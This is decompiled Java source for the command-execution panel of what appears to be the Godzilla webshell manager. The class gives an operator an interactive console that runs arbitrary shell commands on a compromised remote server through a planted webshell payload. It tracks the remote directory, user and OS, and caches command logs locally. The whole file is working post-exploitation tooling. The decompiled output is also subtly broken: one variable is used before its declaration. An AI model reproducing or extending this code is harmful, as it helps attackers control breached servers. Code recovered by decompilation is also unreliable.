/*     */ package core.ui.component;
/*     */ 
/*     */ import core.ApplicationContext;
/*     */ import core.Db;
/*     */ import core.annotation.DisplayName;
/*     */ import core.imp.Payload;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import core.ui.component.menu.ShellPopMenu;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.Color;
/*     */ import java.awt.GridBagLayout;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.FocusAdapter;
/*     */ import java.awt.event.FocusEvent;
/*     */ import java.awt.event.KeyAdapter;
/*     */ import java.awt.event.KeyEvent;
/*     */ import java.io.File;
/*     */ import java.util.ArrayList;
/*     */ import java.util.Arrays;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JLabel;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextField;
/*     */ import javax.swing.JTextPane;
/*     */ import javax.swing.JToolBar;
/*     */ import javax.swing.UIDefaults;
/*     */ import javax.swing.text.BadLocationException;
/*     */ import javax.swing.text.Document;
/*     */ import util.Log;
/*     */ import util.UiFunction;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ 
/*     */ 
/*     */ @DisplayName(DisplayName = "命令执行")
/*     */ public class ShellExecCommandPanel
/*     */   extends JPanel
/*     */ {
/*     */   private static final String SUPER_WIN_COMMAND = "cd /d \"{currentDir}\"&{command}&echo {startStr}&cd&echo {endStr}";
/*     */   private static final String SUPER_LINUX_COMMAND = "cd \"{currentDir}\";{command};echo {startStr};pwd;echo {endStr}";
/*     */   private static final String WINDOWS_COMMAND = "cmd /c \"{command}\" 2>&1";
/*     */   private static final String LINUX_COMMAND = "sh -c \"{command}\" 2>&1";
/*     */   private static final String ENV_COMMAND_KEY = "ENV_ShellExecCommandPanel_Command_KEY";
/*     */   public static final String EXEC_COMMAND_MODE_KEY = "EXEC_COMMAND_MODE";
/*  48 */   private ArrayList<String> last_commands = new ArrayList<>(); private int command_start; private int command_stop; private JToolBar bar; private JLabel status; private JTextPane console; private JScrollPane console_scroll; private Document shell_doc;
/*  49 */   private int num = 1; private Payload shell;
/*     */   private ShellEntity shellContext;
/*     */   private String currentDir;
/*     */   private String currentUser;
/*     */   private String fileRoot;
/*     */   private String osInfo;
/*     */   private ShellPopMenu shellPopMenu;
/*     */   private JLabel commandFormatLabel;
/*     */   private JTextField commandFormatTextField;
/*     */   private JButton saveConfigButton;
/*     */   private File commandLogFile;
/*     */   
/*     */   public ShellExecCommandPanel(ShellEntity shellEntity) {
/*  62 */     super(new BorderLayout());
/*     */     
/*  64 */     this.shell = shellEntity.getPayloadModule();
/*  65 */     this.shellContext = shellEntity;
/*  66 */     this.bar = new JToolBar();
/*  67 */     this.status = new JLabel("完成");
/*  68 */     this.bar.setFloatable(false);
/*  69 */     this.console = new JTextPane();
/*  70 */     this.console_scroll = new JScrollPane(this.console);
/*  71 */     this.commandFormatLabel = new JLabel("命令模板");
/*  72 */     this.saveConfigButton = new JButton("保存配置");
/*  73 */     this.commandFormatTextField = new JTextField(getDefaultOsFormatCommand());
/*     */ 
/*     */     
/*  76 */     this.shell_doc = this.console.getDocument();
/*     */     
/*  78 */     this.shellPopMenu = new ShellPopMenu(this, this.console);
/*  79 */     this.currentDir = this.shell.currentDir();
/*  80 */     this.currentUser = this.shell.currentUserName();
/*  81 */     this.fileRoot = Arrays.toString((Object[])shellEntity.getPayloadModule().listFileRoot());
/*  82 */     this.osInfo = this.shell.getOsInfo();
/*  83 */     this.commandLogFile = new File(String.format("%s/%s/command.log", new Object[] { "GodzillaCache", shellEntity.getId() }));
/*     */ 
/*     */ 
/*     */ 
/*     */     
/*  88 */     this.status.setText("正在连接...请稍等");
/*     */     try {
/*  90 */       this.shell_doc.insertString(this.shell_doc.getLength(), String.format("currentDir:%s\nfileRoot:%s\ncurrentUser:%s\nosInfo:%s\n", new Object[] { this.currentDir, this.fileRoot, this.currentUser, this.osInfo }), null);
/*  91 */       if (shellEntity.isUseCache()) {
/*  92 */         this.shell_doc.insertString(this.shell_doc.getLength(), "\n", null);
/*  93 */         this.shell_doc.insertString(this.shell_doc.getLength(), functions.readFileBottomLine(this.commandLogFile, 2000), null);
/*     */       } 
/*  95 */       this.shell_doc.insertString(this.shell_doc.getLength(), "\n" + this.currentDir + " >", null);
/*  96 */     } catch (BadLocationException e) {
/*  97 */       Log.error(e);
/*     */     } 
/*  99 */     this.command_start = this.shell_doc.getLength();
/* 100 */     this.console.setCaretPosition(this.shell_doc.getLength());
/* 101 */     this.status.setText("完成");
/*     */ 
/*     */ 
/*     */     
/* 105 */     GBC gbcinfo = (new GBC(0, 0, 6, 1)).setFill(2).setWeight(100.0D, 0.0D);
/* 106 */     GBC gbcconsole = (new GBC(0, 1, 6, 1)).setFill(1).setWeight(0.0D, 10.0D);
/* 107 */     GBC gbcbar = (new GBC(0, 2, 6, 1)).setFill(2).setWeight(100.0D, 0.0D);
/*     */ 
/*     */ 
/*     */     
/* 111 */     textareaFocus f_listener = new textareaFocus();
/* 112 */     addFocusListener(f_listener);
/*     */ 
/*     */     
/* 115 */     textareaKey key_listener = new textareaKey();
/* 116 */     this.console.addKeyListener(key_listener);
/*     */ 
/*     */     
/* 119 */     this.bar.add(this.status);
/*     */     
/* 121 */     JSplitPane splitPane = new JSplitPane(0);
/*     */     
/* 123 */     JPanel topPanel = new JPanel();
/*     */ 
/*     */ 
/*     */     
/* 127 */     this.commandFormatTextField.setColumns(100);
/*     */ 
/*     */     
/* 130 */     topPanel.add(this.commandFormatLabel);
/* 131 */     topPanel.add(this.commandFormatTextField);
/*     */     
/* 133 */     topPanel.add(this.saveConfigButton);
/*     */     
/* 135 */     JPanel bottomPanel = new JPanel();
/*     */     
/* 137 */     bottomPanel.setLayout(new GridBagLayout());
/*     */     
/* 139 */     bottomPanel.add(this.bar, gbcinfo);
/* 140 */     bottomPanel.add(this.console_scroll, gbcconsole);
/* 141 */     bottomPanel.add(this.bar, gbcbar);
/*     */ 
/*     */     
/* 144 */     splitPane.setTopComponent(topPanel);
/* 145 */     splitPane.setBottomComponent(bottomPanel);
/*     */     
/* 147 */     add(splitPane);
/*     */ 
/*     */ 
/*     */     
/* 151 */     this.console.setCaretPosition(this.shell_doc.getLength());
/*     */     
/* 153 */     Color bgColor = Color.BLACK;
/* 154 */     UIDefaults defaults = new UIDefaults();
/* 155 */     defaults.put("TextPane[Enabled].backgroundPainter", bgColor);
/* 156 */     this.console.putClientProperty("Nimbus.Overrides", defaults);
/* 157 */     this.console.putClientProperty("Nimbus.Overrides.InheritDefaults", Boolean.valueOf(true));
/* 158 */     this.console.setBackground(bgColor);
/*     */     
/* 160 */     this.console.setForeground(Color.green);
/* 161 */     this.console.setBackground(Color.black);
/* 162 */     this.console.setCaretColor(Color.white);
/*     */     
/* 164 */     this.command_start = this.shell_doc.getLength();
/* 165 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */   
/*     */   private class textareaFocus
/*     */     extends FocusAdapter
/*     */   {
/*     */     private textareaFocus() {}
/*     */ 
/*     */     
/*     */     public void focusGained(FocusEvent e) {
/* 176 */       ShellExecCommandPanel.this.console.requestFocus();
/* 177 */       ShellExecCommandPanel.this.console.setCaretPosition(ShellExecCommandPanel.this.shell_doc.getLength());
/*     */     }
/*     */   }
/*     */   
/*     */   private class textareaKey
/*     */     extends KeyAdapter
/*     */   {
/*     */     private textareaKey() {}
/*     */     
/*     */     public void keyPressed(KeyEvent arg0) {
/* 187 */       if (ShellExecCommandPanel.this.shell_doc.getLength() <= ShellExecCommandPanel.this.command_start && !arg0.isControlDown() && 
/* 188 */         arg0.getKeyCode() == 8) {
/*     */         try {
/* 190 */           String t = ShellExecCommandPanel.this.shell_doc.getText(ShellExecCommandPanel.this.console.getCaretPosition() - 1, 1);
/* 191 */           ShellExecCommandPanel.this.shell_doc.insertString(ShellExecCommandPanel.this.console.getCaretPosition(), t, null);
/* 192 */         } catch (Exception exception) {}
/*     */       }
/*     */ 
/*     */ 
/*     */ 
/*     */       
/* 198 */       if ((ShellExecCommandPanel.this.console.getCaretPosition() < ShellExecCommandPanel.this.command_start || ShellExecCommandPanel.this.console.getSelectionStart() < ShellExecCommandPanel.this.command_start || ShellExecCommandPanel.this
/* 199 */         .console.getSelectionEnd() < ShellExecCommandPanel.this.command_start) && !arg0.isControlDown())
/* 200 */       { ShellExecCommandPanel.this.console.setEditable(false);
/* 201 */         ShellExecCommandPanel.this.console.setCaretPosition(ShellExecCommandPanel.this.shell_doc.getLength()); }
/* 202 */       else { ShellExecCommandPanel.this.console.setEditable((!arg0.isControlDown() || ShellExecCommandPanel.this.console.getCaretPosition() >= ShellExecCommandPanel.this.command_start)); }
/*     */       
/* 204 */       if (arg0.getKeyCode() == 10) {
/* 205 */         ShellExecCommandPanel.this.console.setCaretPosition(ShellExecCommandPanel.this.shell_doc.getLength());
/*     */       }
/*     */     }
/*     */ 
/*     */ 
/*     */     
/*     */     public synchronized void keyReleased(KeyEvent arg0) {
/* 212 */       ShellExecCommandPanel.this.command_stop = ShellExecCommandPanel.this.shell_doc.getLength();
/* 213 */       if (arg0.getKeyCode() == 10) {
/* 214 */         String tmp_cmd = null;
/*     */         try {
/* 216 */           tmp_cmd = ShellExecCommandPanel.this.shell_doc.getText(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.command_stop - ShellExecCommandPanel.this.command_start);
/*     */ 
/*     */ 
/*     */ 
/*     */           
/* 221 */           tmp_cmd = tmp_cmd.replace("\n", "").replace("\r", "");
/* 222 */           if (tmp_cmd.equals("cls") || tmp_cmd.equals("clear")) {
/* 223 */             ShellExecCommandPanel.this.shell_doc.remove(0, ShellExecCommandPanel.this.shell_doc.getLength());
/* 224 */             ShellExecCommandPanel.this.shell_doc.insertString(0, "\n" + ShellExecCommandPanel.this.currentDir + " >", null);
/* 225 */             ShellExecCommandPanel.this.command_start = ShellExecCommandPanel.this.shell_doc.getLength();
/*     */           }
/*     */           else {
/*     */             
/* 229 */             ShellExecCommandPanel.this.status.setText("正在执行...请稍等");
/*     */             
/*     */             try {
/* 232 */               ShellExecCommandPanel.this.execute(ShellExecCommandPanel.this.shell_doc.getText(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.command_stop - ShellExecCommandPanel.this.command_start));
/* 233 */             } catch (Exception e) {
/*     */               
/* 235 */               ShellExecCommandPanel.this.status.setText("执行失败");
/*     */               
/* 237 */               ShellExecCommandPanel.this.console.setEditable(true);
/*     */             } 
/*     */           } 
/* 240 */           if (tmp_cmd.trim().length() > 0) {
/* 241 */             ShellExecCommandPanel.this.last_commands.add(tmp_cmd);
/*     */           }
/* 243 */           ShellExecCommandPanel.this.num = ShellExecCommandPanel.this.last_commands.size();
/* 244 */         } catch (BadLocationException e) {
/*     */           
/* 246 */           e.printStackTrace();
/*     */         } 
/*     */       } 
/*     */ 
/*     */       
/* 251 */       if (arg0.getKeyCode() == 38) {
/* 252 */         ShellExecCommandPanel.this.console.setCaretPosition(ShellExecCommandPanel.this.command_start);
/*     */         try {
/* 254 */           ShellExecCommandPanel.this.shell_doc.remove(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.shell_doc.getLength() - ShellExecCommandPanel.this.command_start);
/* 255 */           ShellExecCommandPanel.this.shell_doc.insertString(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.key_up_action(), null);
/* 256 */         } catch (BadLocationException e) {
/*     */           
/* 258 */           e.printStackTrace();
/*     */         } 
/*     */       } 
/*     */ 
/*     */ 
/*     */       
/* 264 */       if (arg0.getKeyCode() == 40) {
/* 265 */         ShellExecCommandPanel.this.console.setCaretPosition(ShellExecCommandPanel.this.command_start);
/*     */         try {
/* 267 */           ShellExecCommandPanel.this.shell_doc.remove(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.shell_doc.getLength() - ShellExecCommandPanel.this.command_start);
/* 268 */           ShellExecCommandPanel.this.shell_doc.insertString(ShellExecCommandPanel.this.command_start, ShellExecCommandPanel.this.key_down_action(), null);
/* 269 */         } catch (BadLocationException e) {
/*     */           
/* 271 */           e.printStackTrace();
/*     */         } 
/*     */       } 
/*     */     }
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public void execute(String command) {
/* 281 */     StringBuilder logBuffer = new StringBuilder();
/* 282 */     logBuffer.append(this.currentDir + " >" + command);
/* 283 */     logBuffer.append("\n");
/* 284 */     String result = "";
/*     */     try {
/* 286 */       command = command.trim();
/* 287 */       if (command.length() > 0) {
/* 288 */         result = result + execCommand(command);
/*     */       } else {
/* 290 */         result = result + "NULL";
/*     */       } 
/* 292 */       result = result.trim();
/* 293 */       this.shell_doc.insertString(this.shell_doc.getLength(), "\n", null);
/* 294 */       this.shell_doc.insertString(this.shell_doc.getLength(), result, null);
/*     */       
/* 296 */       this.shell_doc.insertString(this.shell_doc.getLength(), "\n" + this.currentDir + " >", null);
/* 297 */       this.command_start = this.shell_doc.getLength();
/* 298 */       this.console.setCaretPosition(this.shell_doc.getLength());
/* 299 */       this.status.setText("完成");
/*     */     }
/* 301 */     catch (Exception e) {
/*     */       try {
/* 303 */         this.shell_doc.insertString(this.shell_doc.getLength(), "\nNull", null);
/*     */         
/* 305 */         this.shell_doc.insertString(this.shell_doc.getLength(), "\n" + this.currentDir + " >", null);
/* 306 */         this.command_start = this.shell_doc.getLength();
/* 307 */         this.console.setCaretPosition(this.shell_doc.getLength());
/* 308 */       } catch (Exception e2) {
/* 309 */         Log.error(e2);
/*     */       } 
/*     */     } 
/* 312 */     logBuffer.append(result);
/* 313 */     logBuffer.append("\n");
/* 314 */     if (!this.shellContext.isUseCache() && ApplicationContext.isOpenCache()) {
/* 315 */       functions.appendFile(this.commandLogFile, logBuffer.toString().getBytes());
/*     */     }
/*     */   }
/*     */ 
/*     */   
/*     */   public String key_up_action() {
/* 321 */     this.num--;
/* 322 */     String last_command = null;
/* 323 */     if (this.num >= 0 && !this.last_commands.isEmpty()) {
/* 324 */       last_command = this.last_commands.get(this.num);
/* 325 */       last_command = last_command.replace("\n", "").replace("\r", "");
/* 326 */       return last_command;
/*     */     } 
/* 328 */     return "";
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public String key_down_action() {
/* 335 */     this.num++;
/* 336 */     String last_command = null;
/* 337 */     if (this.num < this.last_commands.size() && this.num >= 0) {
/* 338 */       last_command = this.last_commands.get(this.num);
/* 339 */       last_command = last_command.replace("\n", "").replace("\r", "");
/* 340 */       return last_command;
/* 341 */     }  if (this.num < 0) {
/* 342 */       this.num = 0;
/* 343 */       return "";
/*     */     } 
/* 345 */     this.num = this.last_commands.size();
/* 346 */     return "";
/*     */   }
/*     */ 
/*     */   
/*     */   public void saveConfigButtonClick(ActionEvent e) {
/* 351 */     this.shellContext.setEnv("ENV_ShellExecCommandPanel_Command_KEY", this.commandFormatTextField.getText());
/* 352 */     GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "保存成功", "提示", 1);
/*     */   }
/*     */ 
/*     */   
/*     */   public String execCommand(String command) {
/* 357 */     switch (Db.getSetingValue("EXEC_COMMAND_MODE", "EASY").toUpperCase()) {
/*     */       case "EASY":
/* 359 */         return execEasyCommand(command);
/*     */       case "KNIFE":
/* 361 */         return execCommandByKnife(command);
/*     */     } 
/* 363 */     return execCommandEx(command);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   private String execCommandByKnife(String command) {
/* 369 */     String start = String.format("[%s]", new Object[] { functions.getRandomString(5) });
/* 370 */     String end = String.format("[%s]", new Object[] { functions.getRandomString(5) });
/*     */     
/* 372 */     if (!this.shell.isWindows()) {
/* 373 */       superCommandFormat = "cd \"{currentDir}\";{command};echo {startStr};pwd;echo {endStr}";
/*     */     } else {
/* 375 */       superCommandFormat = "cd /d \"{currentDir}\"&{command}&echo {startStr}&cd&echo {endStr}";
/*     */     } 
/* 377 */     String superCommandFormat = superCommandFormat.replace("{currentDir}", this.currentDir).replace("{command}", command).replace("{startStr}", start).replace("{endStr}", end);
/*     */ 
/*     */     
/* 380 */     String result = execCommandEx(superCommandFormat);
/* 381 */     if (result != null && result.trim().length() > 0) {
/* 382 */       int index = result.indexOf(start);
/* 383 */       int endIndex = result.indexOf(end);
/* 384 */       StringBuilder builder = new StringBuilder(result);
/*     */       
/* 386 */       if (index != -1 && endIndex != -1) {
/* 387 */         builder.delete(index, endIndex + end.length());
/* 388 */         this.currentDir = functions.subMiddleStr(result, start, end).replace("\r", "").replace("\n", "");
/* 389 */         return builder.toString().trim();
/*     */       } 
/*     */     } 
/* 392 */     return result;
/*     */   }
/*     */   
/*     */   private String execEasyCommand(String command) {
/* 396 */     String[] commands = functions.SplitArgs(command);
/* 397 */     String fileName = commands[0];
/*     */     
/* 399 */     String start = functions.getRandomString(5);
/* 400 */     String end = functions.getRandomString(5);
/*     */     
/* 402 */     if ("cd".equalsIgnoreCase(fileName) && commands.length > 0) {
/* 403 */       String dir = commands[1].replace("\\", "/");
/* 404 */       String str1 = null;
/* 405 */       if (this.shell.isWindows()) {
/* 406 */         str1 = String.format("cd /d \"%s\"&cd /d \"%s\"&&echo {startStr}&&cd&&echo {endStr}", new Object[] { this.currentDir, dir });
/*     */       } else {
/* 408 */         str1 = String.format("cd \"%s\";cd \"%s\"&&echo {startStr}&&pwd&&echo {endStr}", new Object[] { this.currentDir, dir });
/*     */       } 
/* 410 */       str1 = str1.replace("{startStr}", start).replace("{endStr}", end);
/* 411 */       String resultDir = execCommandEx(str1).trim();
/* 412 */       if (resultDir.startsWith(start)) {
/* 413 */         resultDir = resultDir.substring(resultDir.indexOf(start) + start.length()).trim();
/* 414 */         if (resultDir.endsWith(end)) {
/* 415 */           resultDir = resultDir.substring(0, resultDir.indexOf(end)).trim();
/* 416 */           this.currentDir = resultDir;
/* 417 */           return resultDir;
/*     */         } 
/* 419 */         return resultDir;
/*     */       } 
/*     */       
/* 422 */       return resultDir;
/*     */     } 
/*     */     
/* 425 */     String realCmd = null;
/* 426 */     if (this.shell.isWindows()) {
/* 427 */       realCmd = String.format("cd /d \"%s\"&%s", new Object[] { this.currentDir, command });
/*     */     } else {
/* 429 */       realCmd = String.format("cd \"%s\";%s", new Object[] { this.currentDir, command });
/*     */     } 
/* 431 */     return execCommandEx(realCmd);
/*     */   }
/*     */ 
/*     */   
/*     */   public String execCommandEx(String command) {
/* 436 */     String command2 = formatCommandString(command);
/* 437 */     if (ApplicationContext.isOpenC("isSuperLog")) {
/* 438 */       Log.log("mode : %s command : %s", new Object[] { Db.getSetingValue("EXEC_COMMAND_MODE"), command2 });
/*     */     }
/* 440 */     return this.shell.execCommand(command2);
/*     */   }
/*     */   
/*     */   public String formatCommandString(String command) {
/* 444 */     return this.commandFormatTextField.getText().replace("{command}", command);
/*     */   }
/*     */   
/*     */   public String getDefaultOsFormatCommand() {
/* 448 */     return this.shellContext.getEnv("ENV_ShellExecCommandPanel_Command_KEY", this.shell.isWindows() ? "cmd /c \"{command}\" 2>&1" : "sh -c \"{command}\" 2>&1");
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\cor\\ui\component\ShellExecCommandPanel.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */